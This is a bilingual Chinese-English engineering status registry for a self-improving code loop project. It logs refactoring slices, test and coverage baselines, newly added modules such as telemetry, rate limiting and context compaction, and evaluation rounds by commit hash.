# 大任务循环 · 动态状态清单（GRAND-LOOP-REGISTRY）

> 定位：大循环 A→B→C→D 自进化回环的**动态任务清单/状态 registry**（grand-loop-task.md = 指导文件[静态]，本文件 = 执行状态[动态]）。
> 触发口令：**开始执行sloth-loop自进化和蒸馏大厂项目**。按 AGENT_EXECUTION_TEMPLATE v7 + 蒸馏流程 v2.1。
> 维护规则：每轮 OODA 更新本表；ROADMAP 项推进时移入活跃；完成项标 ✅ 留锚。

## 一、大循环定义
A（蒸馏大厂+loop码自进化：A1扫→A2蒸馏file:行段→A3 V1/V2/V3+D7反向→A4改loop码adopted回填→A5落盘+蜂群D6/D13→A6提交→A7判流程无误?否回A1/是进B）
→ B（用蒸馏实测真值修正 architect-skills 真包；Russell 周期重封存落盘）
→ C（用修正后16维评估 sloth-loop/蜂群→覆盖矩阵+缺口+风险分级→修正 sloth-loop/蜂群 adopted回填+pytest+gate）
→ D（梳理大任务清单+动态维护+OODA每细节+回环 A→B→C→D→完善→回A）

## 二、Cycle-1 执行状态（2026-09-05）
| 阶段 | 状态 | 交付 | commit |
|------|------|------|--------|
| A（iter#1-3 蒸馏 TencentDB@2ee2239） | ✅ A7 流程无误(open audit iter#3 全closed) | D6 9/9 + D7 V3反向 + Russell + D12 | 766209c/24be2bb/56b1b6e |
| Phase2（TEMPLATE v1.5） | ✅ | Russell回写+TencentDB真值校正3类 | 039e67d |
| 存储(grand-loop指导) | ✅ | grand-loop-task.md+GRAND-LOOP.md+_INDEX | 74d7ad9 |
| **B** 修正 architect-skills | ✅ 闭合 | 校正5点(agent⑥2/observability⑨1)+ARCHITECTURE-COVERAGE.md补建断链闭合+TEMPLATE v1.6+Russell落盘(report/tracker/golden changelog)+唤醒更新 | 93f86a4/8ba5117 |
| **C1** Intake 建图 | ✅ | 架构层7步+证据→维度映射表+3 godfile定位 | 321030f |
| **C2** full-L2 评估 | ✅ | 16维覆盖矩阵(9covered/4partial/1missing/3N-A)+缺口(H1/M1/M2/gated)+风险分级 | (architect-skills l2-evaluation.md,非git) |
| **C3-1** ratchet 修正 | ✅ gate PASS | fail_under 64→70(actual cov72.27,772passed) | 64de89b |
| **D** 大任务清单+回环 | ✅ 本文件 | 动态registry+唤醒更新 | a9a64de |

**Cycle-1 结论**：A7 蒸馏流程无误 ✅；B 闭合 ✅；C 评估+部分修正 ✅；D registry ✅。大循环 cycle-1 完整闭合。HEAD=64de89b(D前)。

## 三、ROADMAP backlog（自循环完善项，按优先级）
| ID | 优先级 | 项 | 维 | 风险 | 触发/依赖 | 状态 |
|----|--------|----|----|------|----------|------|
| H1-P1 | high | 拆 memory_store.py(1432→1375 P1a→1305 P1b→1135 P1c→1056 P1d done;续 P1e checkpoint/P1f L2分析/P1g corrections→目标<800) | ③/⑤ | high① | atomic slice+pytest+gate | P1a-b-c-d✅closed(772green;P1d 排除检查→pattern_store_exclusion mixin,零依赖)；P1e-g queued |
| H1-P2 | high | 拆 ooda_pipeline.py(930) | ③/⑥ | high① | P1后 | queued |
| H1-P3 | high | 拆 orchestrator.py(804,刚过线) | ③/⑥ | high① | P2后 | queued |
| M1 | medium | ⑩observability: trace_id传播+metrics后端(noop降级,对齐B校正architect-observability) | ⑩ | medium⑤⑥ | 中改动slice | queued |
| M2 | medium | ⑦net sandbox OS级(P4) | ⑦ | medium | 设计延期P4 | deferred-P4 |
| G1 | 信息项 | ⑥subagent/E4真蜂群/E5三域: model-gated(无LLM层) | ⑥ | gated | loop引入model层时升adopted | gated-locked(正确) |
| — | low | ⑧继续小步ratchet 70→72 | ⑧ | low | actual cov驱动 | optional |

## 四、下一回环方向（自驱，遇阻才停）
- 优先：C3-2 H1-P1（拆 memory_store.py）——最大 godfile，high①。需先 OODA observe 其内聚边界(schema/migration/transaction/query/L2)再定安全首切，每切独立 atomic commit + pytest 跑绿 + gate。
- 次选：回A 新大厂蒸馏（project-scan-list 选下一项目；A7已验流程无误，可复用）。
- 决策：H1-P1 为 high① 实质改善，优先于新蒸馏；若首切风险过高(772测试强耦合)则记设计+回 A/或 M1。

## 五、唤醒锚（git log 可查最新）
commit 链：766209c→24be2bb→56b1b6e→039e67d→74d7ad9→93f86a4→8ba5117→321030f→64de89b→a9a64de。

## ??Cycle-2 update (2026-09-06) - H1-P1e + record fix (English; Chinese channel mangled on host)

### 6.1 H1-P1e done (commit 6844f87)
- Slice: checkpoint/resume cluster (6 methods: save_checkpoint/load_checkpoint/load_latest_checkpoint/clear_checkpoint/learn_done/mark_learn_done) moved to new mixin sloth_engine/pattern_store_checkpoint.py (class PatternStoreCheckpoint, behavior-preserving via MRO, zero module-level deps).
- memory_store.py: 1055 -> 946 lines (godfile still > 800; P1f L2-analysis + P1g corrections remain).
- Verify: pytest 772 passed / 1 skipped (gate cov 72.34%); run_gate PASS (ratchet fail_under=70 == HEAD=70); files UTF-8 no BOM; mixin compiles; 6 methods present in mixin, absent from memory_store.
- pre-commit hook (run_gate.py) PASS.

### 6.2 Record-gap check + fix (user mandate: each round recorded in detail)
- Round1 dir 20260905-185813-grand-loop-B-round1 held P1a-P1d as .py scripts + commit msg .txt but P1b/c/d lacked dedicated OODA narrative .md -> backfilled in work_ooda/20260906-040818-grand-loop-round2-P1e/backfill-p1bcd-round1.md (evidence-based from scripts + git log).
- This round2 dir 20260906-040818-grand-loop-round2-P1e/ooda-round2-P1e.md = full OODA (Observe/Decide/Act/Verify + verdict-evidence table + commands + exit codes).
- This footer (section ?) replaces the stale commit-chain pointer below.

### 6.3 Full commit chain (corrected, through P1e)
766209c -> 24be2bb -> 56b1b6e -> 039e67d -> 74d7ad9 -> 93f86a4 -> 8ba5117 -> 321030f -> 64de89b(C-cycle1) -> a9a64de(D-registry cycle1) -> 3230295(H1-P1a) -> a15d131(H1-P1b) -> 335ac9f(H1-P1c) -> e51284b(H1-P1d) -> 6844f87(H1-P1e)

### 6.4 H1-P1 status
- P1a/P1b/P1c/P1d/P1e: CLOSED (772 green, zero regression each).
- Remaining to reach memory_store < 800: P1f (L2-analysis cluster), P1g (corrections cluster); optional classify_failure/classify_success statics.
- After memory_store < 800: proceed H1-P2 (ooda_pipeline.py 930) / H1-P3 (orchestrator.py 801) / M1 (observability trace_id + metrics noop).

## ??H1-P1 closed (2026-09-06) - P1f/g/h + <800 target reached
### 7.1 P1f (commit 3f8c2b6) - L2 analysis/suggestion cluster -> pattern_store_l2.py (PatternStoreL2 mixin). memory_store 946->880.
### 7.2 P1g (commit c47973a) - corrections cluster -> pattern_store_corrections.py (PatternStoreCorrections mixin). memory_store 880->820.
### 7.3 P1h (commit 4270dc9) - classify statics + dead P0-comment cleanup -> pattern_store_classify.py (PatternStoreClassify mixin). memory_store 820->783.
### 7.4 H1-P1 NET: memory_store.py 1432 -> 783 lines (<800 target REACHED). 8 atomic commits P1a..h. 772 passed throughout, gate PASS each. Newline hygiene fixed (Python text-mode '\r\r\n' corruption -> open(newline='')).
### 7.5 Full commit chain through 4270dc9
766209c -> 24be2bb -> 56b1b6e -> 039e67d -> 74d7ad9 -> 93f86a4 -> 8ba5117 -> 321030f -> 64de89b -> a9a64de -> 3230295(P1a) -> a15d131(P1b) -> 335ac9f(P1c) -> e51284b(P1d) -> 6844f87(P1e) -> 3f8c2b6(P1f) -> c47973a(P1g) -> 4270dc9(P1h)
### 7.6 Next ROADMAP (cycle-2 continues)
- H1-P2: split ooda_pipeline.py (930 lines, >800) into mixins.
- H1-P3: split orchestrator.py (801 lines, just over).
- M1: observability - trace_id propagation + metrics backend (noop fallback, align with B-corrected architect-observability).
- Then fresh A->B->C->D scan; 3 consecutive no-fixable rounds => convergence stop (else until #6 block).

## ??H1 fully closed (2026-09-06) - P2a/P3a, all 3 godfiles <800
### 8.1 P2a (commit d151543) - ooda_pipeline._learn -> ooda_steps_learn.py (OODAStepsLearn mixin). ooda_pipeline 930->784.
### 8.2 P3a (commit 6ec4bf9) - orchestrator._safe_run_component -> orchestrator_safety.py (SafeComponentMixin). orchestrator 805->789.
### 8.3 H1 NET: memory_store 783, ooda_pipeline 784, orchestrator 789 - all <800. 10 atomic slices P1a-h/P2a/P3a. 772 passed throughout, gate PASS each. Newline hygiene fixed (open(newline='')).
### 8.4 Full commit chain through 6ec4bf9
766209c -> ... -> e51284b(P1d) -> 6844f87(P1e) -> 3f8c2b6(P1f) -> c47973a(P1g) -> 4270dc9(P1h) -> 170f33f(docs P1fgh) -> d151543(P2a) -> 6ec4bf9(P3a)
### 8.5 ROADMAP remaining (cycle-2 continue)
- M1: observability - trace_id propagation + metrics backend (noop fallback), align with B-corrected architect-observability. Medium feature (not mechanical extraction).
- M2: net sandbox OS-level - deferred P4 (not currently actionable).
- G1: subagent/swarm - model-gated-locked (correct; no LLM layer in loop; raise to adopted only when a model layer is introduced).
- low: ratchet fail_under 70->72 (optional; held because direct pytest cov 70.84% vs gate cov 72.34% discrepancy - needs investigation before raising floor).
### 8.6 Next: assess M1 feasibility (current trace_id/metrics scaffolding + architect-observability spec); attempt minimal trace_id+metrics-noop if bounded, else mark next-actionable and move toward convergence assessment.

## ??M1-1 done + grand-loop session checkpoint (2026-09-06)
### 9.1 M1-1 (commit 1fb4846) - observability dim 10 scaffolding
- New sloth_engine/telemetry.py: TraceBackend protocol + NoopTraceBackend (default, records nothing) + ConsoleTraceBackend (local-dev) + create_backend(type) factory that degrades to NoopTraceBackend on missing/unknown/failing backend (never raises into core path).
- Satisfies architect-observability B-corrected checklist item 'telemetry backend pluggable factory + noop fallback' (TencentDB true-value anchored).
- 8 new tests (tests/test_telemetry.py). Purely additive, no hot-path integration. pytest 772->780 passed, run_gate PASS.
### 9.2 Session net (2026-09-06)
- H1 fully closed: memory_store 1432->783, ooda_pipeline 930->784, orchestrator 805->789 (all <800). 10 atomic refactor slices (P1a-h, P2a, P3a).
- M1-1: telemetry backend factory+noop (8 tests, 2 files).
- 772->780 passed throughout, zero regression, run_gate PASS each (ratchet 70==HEAD 70). Commits UTF-8 no BOM; newline hygiene fixed (open(newline='')).
- Records: work_ooda/20260906-040818-grand-loop-round2-P1e/ (ooda-round2-P1e.md, p1fgh-slice.md, p2p3-slice.md, backfill-p1bcd-round1.md, session-summary.md). Registry sections 6/7/8/9.
### 9.3 Full commit chain through 1fb4846
... -> 4270dc9(P1h) -> 170f33f(docs) -> d151543(P2a) -> 6ec4bf9(P3a) -> bb951ef(docs) -> 1fb4846(M1-1)
### 9.4 Convergence assessment (NOT converged; counter=0)
- Every round this session fixed a real ROADMAP item -> no 'no-fixable' round yet.
- Remaining fixable: M1-2 (thread trace_id into RoundContext/run_loop + invoke create_backend from config = hot-path integration, do incrementally with tests); M1 SLI/SLO + logs/metrics/traces correlation + alerting (large); low ratchet 70->72 (HELD: direct-pytest cov 70.84% vs gate cov 72.34% discrepancy needs investigation before raising floor).
- Not currently actionable (do NOT count as fixable): M2 net-sandbox (deferred P4); G1 subagent/swarm (model-gated-locked = correct, no LLM layer in loop).
- Next resumable step: M1-2 minimal guarded slice (trace_id in RoundContext + one opt-in span emit, Noop-by-default preserves behavior), then reassess convergence.

## 10 Round-3 backfill (2026-09-06) - record-integrity closure per template v7 sec 8

> User mandate after cycle-2: backfill the 3 cycle-2 record gaps and re-correct the grand-loop process itself against AGENT_EXECUTION_TEMPLATE v7. This section is the registry record of that closure round (OODA self-audit requested by user).

### 10.1 Backfills landed (commits)
- edf2a55: M1-1 OODA slice (m1-slice.md) + ISSUES.md + AGENT_ERROR_LOG.md equivalent statements (template v7 sec 8 mandatory deliverables).
- b1dada5: _INDEX.md cycle-2 backfill - rechecked tencentdb-telemetry-stack hook (M1-1 fired it) -> partial-filled; candidate count 23 unchanged N==M.
- a276c7f: docs sync - CHANGELOG sec 8 (cycle-2) + NEXT.md refresh + AS-BUILT sec 9 revision note.
- 362e479: grand-loop-task.md aligned with template v7 - sec0.1 #15 + sec6.1 per-round deliverables + sec8.2 checklist items + sec8.4 record-integrity self-check.

### 10.2 OODA self-audit (user: verify record-process correction via OODA)
- Observe: cycle-2 had 3 record gaps (M1-1 missing slice; ISSUES/AGENT_ERROR_LOG absent; _INDEX hook not same-round rechecked); formal docs (GRAND-LOOP/CHANGELOG/NEXT/ROADMAP/AS-BUILT) stale on cycle-2; the process guide lacked a per-round record self-check.
- Decide: close all via backfill commits 10.1 + process fix 362e479.
- Act/Verify: pytest tests/test_telemetry.py = 8 passed; _INDEX N==M (candidate 23 unchanged); gate clean; formal docs synced; sec8.4 now hard-prevents recurrence.

### 10.3 HEAD / baseline
- Code stable HEAD = 1fb4846 (M1-1); record-backfill HEAD = 362e479 (this round). pytest 780 passed / 1 skipped; run_gate PASS (ratchet 70 == HEAD 70). 3 godfiles <800 (memory_store 783 / ooda_pipeline 784 / orchestrator 789); sloth_engine/telemetry.py added (dim 10 scaffold).

### 10.4 Next
- M1-2 minimal guarded slice (thread trace_id into RoundContext + opt-in span emit, Noop-default preserves behavior); then reassess convergence (counter still 0).



## 11 C 阶段 round2 增量复评 (2026-09-06)
> B 阶段 round2 修正后（⑩ +2 子项 / ⑧ +1 子项）对 sloth-loop 的增量复评。完整报告：architect-skills output/sloth-loop/2026-09-06/l2-evaluation.md。评估期间 loop 代码自 C2(2026-09-05 l2-evaluation.md)后未变（M1-1 脚手架完成于 C2 前 + 自此 docs/Russell）。本 §11 supersede §三 M1 row 的 stale "queued" 状态。

### 11.1 增量结果
- ⑩-9 OTel 标准语义约定: missing（telemetry.py report_span(**fields) 无 SpanKind/OpenInference/llm.；grep 0 hit）。并入 M1-2，提精度不提级（medium⑤⑥ 不变）。
- ⑩-10 trace exporter 路由多范式: missing（_BACKENDS 仅 noop/none/console，无 OTLP/SQLite/平台落盘/collector；grep 0 hit）。并入 M1-2。
- ⑧-8 AI 输出评测框架: partial / scope-N-A-for-now（sloth-loop 有比例轻量评测 verifier+golden+l2_analyzer+run_reporter；resume/self-modify 幂等由 run_lock/resume_guard/migrations v004/005 实现异域。缺多 evaluator 类型/实验状态机/eval 沙箱/SetNX；单机非 coze-loop 多租户平台，全套=over-engineering）。登记 low + 复检钩子。

### 11.2 ROADMAP §三 row 变更（本 §11 supersede §三 M1 row stale 状态）
- M1 状态更新: §三「queued」→ M1-1 ✅ closed（scaffold factory+noop，commit 1fb4846）; M1-2 queued，scope 扩（B-round2 ⑩ enrichment）= M1-2a(OTel 语义约定 span 模型脚手架) / M1-2b(trace_id 传播入 RoundContext/run_loop + opt-in noop-default span emit) / M1-2c(选 exporter 路由范式 + metrics 通道)。每子切片独立 atomic + pytest + gate。
- 新增 ⑧ row: ⑧ eval-framework, low, scope-N-A-for-now, 复检钩子=loop 扩多租户/多用户 agent 评测时重查。

### 11.3 本轮代码修复: 无
- 本轮无新可原子修代码项。⑩ enrichment 须 span 模型+热路径设计→M1-2 有序子切片落 ROADMAP（D-discipline 禁乱执行/禁只做部分）。⑧ scope-N/A 非必修。

### 11.4 收口 + next resumable
- C 阶段 round2 闭合（增量复评 + ROADMAP scope 扩展 + ⑧ 登记）。HEAD: 25e3fe6(B-round2)→dea7375(anchor-fix)→3d203cb。
- Next resumable slice: M1-2a（span 语义约定模型脚手架，additive 测试，对齐 M1-1 范式）→ M1-2b（trace_id 热路径，需先 OODA observe RoundContext/run_loop 耦合）。
- 收敛计数: 仍 counter=0（本轮登记 + ROADMAP scope 扩展为实质推进，非 converged-no-fix）。

## 12 C 阶段 round3 增量复评 (2026-09-06)

> 自 §11(C-round2) 起 A 增 iter#8(autogen3)+iter#9(deer-flow3)=6 candidate（⑩2/⑥2/⑦sandbox2，全 provisional 准入）；sloth-loop 代码自 M1-1(1fb4846) 未改（仅 docs/distill/registry/GRAND-LOOP）。 pełny 增量复评见 architect-skills output/sloth-loop/2026-09-06/l2-evaluation.md（C 阶段 round3 段）。16 维 code-side 覆盖沿用 C-round2（code 未变）。

### 12.1 增量结果（来源增量，非 code 缺口变化）
- ⑩：autogen-tracing(OTel+GenAI semconv) + deer-flow-langfuse(session_id=thread_id 分组+opt-in gating+dual-path) 2 源增量；⑩-9/⑩-10 code 仍 missing（telemetry.py fresh grep SpanKind/OpenInference/gen_ai/otLP/exporter = 0 hit）。enrichment 提精度不提级，并入 M1-2a(语义)/M1-2b(trace_id 热路径+grouping)/M1-2c(exporter)；medium⑤⑥ 不变。
- ⑥：autogen-swarm(handoff) + deer-flow-subagent-capacity-status(admission FIFO+结构化 status+安全门) 2 源增量→现 3 源(eino-adk-react/autogen-swarm/deer-flow-subagent)；G1 gated-locked 不变。
- ⑦sandbox：autogen-docker(OS 容器) + deer-flow-lease+projection(process-local 非 OS 级) 2 源增量→现 3 源(adk-docker/autogen-docker/deer-flow-lease)；M2 deferred-P4 不变。

### 12.2 §8.4.3 钩子同轮复检
- 本轮 sloth-loop 0 代码改（docs-only eval）；⑩/⑥/⑦/⑧ candidate 复检钩子触发条件均未满足（loop 未实施 M1-2/subagent/sandbox/多租户评测代码）→ 全 N/A；candidate 回填『未回填』全不变；_INDEX candidate 计数 39 不变（N==M 仍 39）。

### 12.3 顺手记修（记录完整性）
- 解析 §11.4 末遗留自引用 '（本 C-round2 docs commit）' → 3d203cb（C-round2 substantive；同 iter#9 L23/L44 cycle-1 残留卫生; broad half-width （本commit） grep 新增 gap variant 本.{0,40}commit 正则盘点锁定）。

### 12.4 收口 + next
- C 阶段 round3 闭合（增量复评 + 源增量登记 + §11.4 残留解析）。risk 全 0 变；无新缺口；无新可原子修代码项（D-discipline）。M1-2a(span 语义模型脚手架)经 6-⑩ 源 backed + 本轮确认 = next bounded actionable(A4 代码自进化切片，非本轮 C 修复)。
- 收敛计数：仍 0（本轮 C 评估无 ROADMAP fixable 推进）。
- HEAD: 5618ef5(A9-anchor)→0c0a341(C-round3-substantive)。
## Cycle-3 update (2026-10-16) - next repo (sloth-loop, dev branch)

### 13.1 Scope of this round
- Host: `<WORKSPACE_ROOT>/loop-dev-next` (dev). Paths redirected from the old
  repo per Prompt.md section 2.5.3 (sloth-loop -> sloth-loop); the other 3 roots
  exist and were used as-is.
- Input: two external test/acceptance packages under `<WORKSPACE_ROOT>/loop-test-output`
  (gpt-loop-dsh-stress-20261015, workbuddy-sloth-loop-...-2026-10-15).
- These packages tested 0927 zip @ `0e7a9f0` (no P0 fix). In next @ `2a1cdd2`
  we re-confirmed which findings still hold (3-round md5-identical retest).

### 13.2 L1 fix batch (second) - commits
- `0560476` fix(P1): D9 purity BOM (utf-8-sig), D8 non-UTF8 signals caught,
  D4 config require_exists -> exit 2, D7 threshold type fail-closed, P0D gate --all.
  Tests +11 (`tests/test_p1_failclosed_batch.py`). 1184 passed / cov 72.01%.
- `9356759` docs: lesson 22 + audit REPORT section 14.

### 13.3 L3 scene A - distilled adopted item (commit)
- `dc9a035` feat(self-modify-gate): read-before-write guard, adopted from
  deer-flow contract (evidence `contracts/run_event_stream_contract.json:434-436`,
  `docs/superpowers/plans/2026-07-02-read-before-write-gate.md:5-7`).
  Tests +2. 1186 passed / cov 72.02%.
- A7: distillation process correct -> proceed to B.

### 13.4 Scene B / C (read-only)
- B: architect-skills evaluated read-only; 1 new medium B-round candidate
  (terminal marker vs authoritative status; compatibility + known_gaps block).
  NOT written to architect-skills (read-only constraint).
- C: 16-dim coverage matrix: covered 9 / partial 4 / missing 1 / N-A 3.
  Gap: observability (missing, M1-2), git/ops/frontend partial (local form).

### 13.5 Known gaps in next (recorded, NOT silently skipped) - section 0.1#6
- `docs/knowledge-distillation/` does NOT exist in next (old lib private/gitignored).
  Therefore `_INDEX.md` / `SOURCE/` / `_TEMPLATE` / `DISTILLATION-VERIFICATION`
  are absent: the L3 ledger must be rebuilt (D-phase backlog item GL-D-1).
  - **REBUILT 2026-10-17 (GL-D-1 closed)**: skeleton created at
    `docs/knowledge-distillation/` (README/_TEMPLATE/_INDEX/SOURCE/
    DISTILLATION-VERIFICATION/project-scan-list + 7 subdirs + _SOURCE).
    Stays gitignored (`.gitignore:92`) per repo convention => local working
    ledger, not shipped. Old entry bodies pending D-phase backfill (N==M=0 now).
- Round artifacts placed under `work_ooda/20261016-212105-grand-loop-cycle3/`
  and `...-retest/`.

### 13.6 Commit chain (this round)
0560476(L1-batch2) -> 9356759(docs-lesson22) -> dc9a035(A4-adopted-C3)

### 13.7 L1 batch 3 (third) - remaining fail-closed fixes (2026-10-17, next @ dev)
- 5 fixes landed, one commit each, gate PASS each, all 3-round md5-identical:
  - `572868f` P2-1 report_util input_ref -> real archived run input path.
  - `bd7a658` P1-3 corrupt DB -> CorruptDatabaseError (actionable, fail-closed).
  - `cd10878` D5 empty success_criteria no longer a silent default ([WARN] CRITERIA-IMPLICIT).
  - `14a394a` P1-6 archive raw run I/O (input + model output) per run.
  - `751d7f2` P1-4 schema_validate defaults to true (fail-closed; =false opt-out).
- Baseline after batch 3: **1194 passed / 1 xfailed / coverage 72.13%** (HEAD 751d7f2).
- External-findings retest md5 `cfd2d6efd2c3c92374535b7d3c04f8f3` unchanged.
- Evidence: `work_ooda/20261017-093515-l1-batch3-five-fixes/`; report
  `projects/loop/l1-batch3-five-fixes/reports/2026-10-17/REPORT.md`.

### 13.8 docs baseline-consistency + optimization (2026-10-17, docs-only)
- Current-state docs unified to measured 1194 passed / 1 xfailed / coverage 72.13%
  (Prompt/README/CLAUDE/RUNBOOK/ONBOARDING/AS-BUILT/ROADMAP/DEV-SETUP/USAGE/project-intro).
- Historical milestone numbers (ROADMAP sec4, CHANGELOG history, AS-BUILT cycle-2) kept as
  evidence and annotated, per convention.
- pyproject typo `httpx2` -> `httpx>=0.27` (FIX-1 closure).


### 13.9 L3 cycle-4 scene A - distilled adopted item (2026-10-18, next @ dev)
- Scope (user Step C): **A only** (one distillation loop); distill target
  `<WORKSPACE_ROOT>/other_project/999-hindsight-core` (vectorize-io/hindsight); loop code
  changes allowed (A4 backfill); architect-skills read-only this round.
- A1 scan: 1900 .py / 573 .ts / 245 .go; core `hindsight-api-slim/hindsight_api/engine/`
  47 files / 44705 lines. No `.git` -> no commit -> all evidence provisional (file:line only).
  3 candidates: C1 (4-way parallel retrieval + bounded multiplicative rerank),
  C2 (DeferOperation backpressure not counted), C3 (config tristate) -> picked C1+C2.
- A2 distill (candidate): 2 entries under `docs/knowledge-distillation/agent-orchestration/`.
- A3 V1/V2/V3 + D7 reverse samples: C2 reverse sample DOES NOT hold (loop had no
  defer/backpressure branch -> real gap); C1 reverse sample does not hold either.
- A4 adopted backfill (C2) -> commit **`eb9f4b6`**: `sloth_engine/backpressure.py` (new,
  pure/fail-closed classifier) + defer branch in `run_loop.py::run()`/`iter_loop()`
  (before the failure path, never counts) + `LoopState.deferred` + `loop.backpressure_defer_enabled`.
  Tests: `tests/test_backpressure_defer.py` (+16, incl. end-to-end A/B).
- Baseline: 1200 -> **1216 passed / 1 xfailed / coverage 72.21%**; `run_gate --all` PASS.
- A6 commit; A7: distillation process correct -> B (read-only this round).
- Evidence: `work_ooda/20261017-190000-grand-loop-cycle4-A/`. Ledger N==M==2 (C2 -> adopted).

### 13.10 Round loop-back decision (cycle-4)
- L1 open items: none actionable this round (no new fixable code item from C).
- C1 stays candidate (not landed); C3 candidate-pending.
- Next resumable: complete B/C with architect-skills write-back (separate round, per user),
  or land C1 (bounded multiplicative rerank) as an A4 slice.

### 13.11 L3 cycle-5 scene A - distilled adopted item C1 (2026-10-18, next @ dev)
- A3 correction (honesty): cycle-4 recorded C1 as "not landed"; re-measurement
  found loop ALREADY has 4-way-style retrieval + fusion + a multiplicative layer
  boost (`bm25_retrieval.py:122-143/174-246`, `rag_layers.py:218-238`, `:228`).
  The genuine gap was narrower: recency-decay + proof-count multiplicative factors
  (hindsight `reranking.py:56-78`/`:193-198`).
- A4 adopted backfill -> commit **`a6fd7ab`**: `rag_layers.py` gains
  `recency_decay`/`recency_boost`/`proof_count_boost`/`combined_score` (bounded,
  deterministic, alpha=0 -> identity) + `LayeredMemory.search()` knobs; config
  `loop.rerank_*` (defaults identity); orchestrator wiring. Tests:
  `tests/test_rag_rerank.py` (+18).
- Baseline: 1216 -> **1234 passed / 1 xfailed / coverage 72.35%**; `run_gate --all` PASS.
- Ledger N==M==2 (C1 -> adopted). Evidence: `work_ooda/20261018-020000-grand-loop-cycle5-A/`.

### 13.12 Round loop-back decision (cycle-5)
- L1 open items: none actionable this round.
- Both distilled candidates (C1, C2) are now adopted; C3 candidate-pending.
- Next resumable: complete B/C with architect-skills write-back (separate round,
  per user), or scan a fresh source project (e.g. lobehub-canary / open-webui-main).

### 13.13 L3 cycle-5 scenes B/C (read-only architect-skills) - 2026-10-18
- Scope (user-confirmed): architect-skills is READ-ONLY; all B/C outputs land
  inside sloth-loop. No external write; no pipeline.config.json edit.
- Read-only survey: architect-skills has been UPGRADED to a 19-row matrix
  (+architect-context / architect-rag) with contract/guide layering.
  architect-rag/contract.json meta.source = "hindsight-core (999) + DSH RAG KB
  + sloth-loop dsh-rag-kb" -> the A->B feedback loop is confirmed.
- B (correction recommendation, loop-side): BV-1 RAG-04 sub-item (bounded
  multiplicative rerank when no cross-encoder) is an OPTIONAL enhancement;
  RAG-01/RAG-02/RAG-07 and TES-10 are already present and loop is a POSITIVE
  sample -> no new checkpoint gap. Written to
  `work_ooda/20261018-020000-grand-loop-cycle5-A/B-correction-recommendation.md`.
- C (evaluation): 19-dim coverage = covered 14 / partial 4 (net/ops/compliance/
  frontend - local-form) / N-A 1 (performance, hook present). No critical/high.
  observability: cycle-3 "missing" -> now covered (telemetry.py factory+noop,
  M1-1); only multi-tenant/exporter routing is N/A-for-now (C5-1). No new
  atomic-fixable loop code gap this round (C5-2/C5-3 closed positively by A).
  Written to `work_ooda/20261018-020000-grand-loop-cycle5-A/C-evaluation-matrix.md`.
- Loop-back: A(iter) -> B/C done for this cycle; next = fresh source scan
  (lobehub-canary / open-webui-main) or B-round write-back (needs external
  write authorization). No loop code change this segment -> docs-only commit.
### 13.14 L3 cycle-6 scene A - distilled adopted items C4+C6 (2026-10-18, next @ dev)
- Fresh source scan (startup mode): `open-webui/open-webui`@v0.11.3 (local
  `<WORKSPACE_ROOT>\other_project\open-webui-main`; NO .git -> no commit ref,
  all evidence is file:line; conclusion level capped at candidate/provisional).
- A1 scan: 261 py / 83 ts; picked C4 (rolling-window rate limiter + Redis->memory
  fallback) and C6 (context compaction checkpoint); C5 (vector factory + multi-tenancy)
  left candidate-pending (overlaps loop plugin layer).
- A2 distill (candidate): 2 entries under
  `docs/knowledge-distillation/agent-orchestration/2026-10-18-open-webui-*.md`;
  ledger N==M bumped 2 -> 4.
- A3 V1/V2/V3 + D7 reverse samples (real, reproducible):
  C4 reverse sample does NOT hold -> loop has NO rate limiter (only string
  keywords "rate limit"/"throttl" in backpressure.py:65/error_recovery.py:54 as
  backpressure DETECTION, not limiting) -> real gap.
  C6 reverse sample partially holds -> loop HAS ContextCompactor but reactive/auto
  do `self._history = [summary]` (wipe, no previous-summary chain) and no
  proportional-retention boundary -> real refinement gap.
- A4 adopted backfill -> commit **`7082bf5`**: `sloth_engine/rate_limiter.py` (new,
  pure/zero-dep: RollingWindowRateLimiter + RateLimitBackend Protocol; backend
  failure degrades fail-to-memory, never fail-open-to-unlimited) +
  `sloth_engine/context_compactor.py` (incremental: retention_boundary +
  compact_with_checkpoint with previous_summary chaining; reactive/auto now record
  previous_summary, backwards compatible). Tests: `tests/test_rate_limiter.py` (+12),
  `tests/test_context_compaction_checkpoint.py` (+9).
- Baseline: 1234 -> **1255 passed / 1 xfailed / coverage 72.68%**; `run_gate --all` PASS.
- Ledger N==M==4 (C4 -> adopted, C6 -> adopted; C3/C5 candidate-pending).
  Evidence: `work_ooda/20261018-090000-grand-loop-cycle6-A/`.

### 13.15 Round loop-back decision (cycle-6)
- L1 open items: none actionable this round.
- Distilled candidates C4 and C6 are now adopted; C3/C5 stay candidate-pending.
- Next resumable: scan a fresh source project, or B/C round with architect-skills
  write-back (needs external write authorization, separate round per user).
### 13.16 L3 cycle-6 scenes B/C (architect-skills git-baselined + full-dim eval) - 2026-10-19
- User authorization: B round MAY write architect-skills; first give it version control.
- B0: architect-skills had NO .git. `git init` + freeze commit **`d295f23`** (187 tracked
  = 186 files + .gitignore); pre-change SHA256 manifest saved. Now fully rollback-able.
- B1 read-only survey: **19 dims / 185 checks** (architect-router + 18 atom; each has
  contract.json/guide.md/SKILL.md). Matrix dumped to scripts/tmp/c6/arch_contracts.txt.
  Found: architect-agent/contract.json + architect-context/contract.json carry UTF-8 BOM
  (other 17 do not) - logged, non-blocking.
- B2 correction from cycle-6 A truth values: C4 (rate limit) / C6 (compaction checkpoint)
  do NOT constitute hard gaps in architect-skills. CTX-02 (>=3 layers), CTX-04 (fuse x3),
  CTX-08 (compression reversible) already in the checklist; loop is a POSITIVE sample.
  Only BV-1 (CTX-08 sub-item) and BV-5 (a NEW rate-limit checkpoint, no current home)
  are OPTIONAL enhancements. -> no contract rewrite this round; recorded in
  `work_ooda/20261018-090000-grand-loop-cycle6-A/B-correction-assessment.md`.
- C: full 19-dim evaluation of sloth-loop @ 77915c4 (1255 passed / 72.68%):
  **covered 11 / partial 6 / N/A 2; 0 critical/high**. Gap ids C6-1..C6-5 all either
  gated in ROADMAP (net retry / sandbox / CI) or acceptable (domain model / cost / frontend).
  Written to `work_ooda/20261018-090000-grand-loop-cycle6-A/C-evaluation-matrix.md`.
- Loop-back: A(cycle-6) -> B/C done (B now write-capable but no rewrite needed).
  No sloth-loop code change this segment; architect-skills itself only git-initialized
  (no contract content changed). sloth-loop commit = docs-only registry update.

### 13.17 Round loop-back decision (cycle-6 B/C)
- L1 open items: none actionable.
- architect-skills is now under git; future B rounds can write with full rollback.
- Next resumable: scan a fresh source project (cycle-7), or file the BV-1/BV-5
  optional enhancements into architect-skills as a deliberate B-increment.
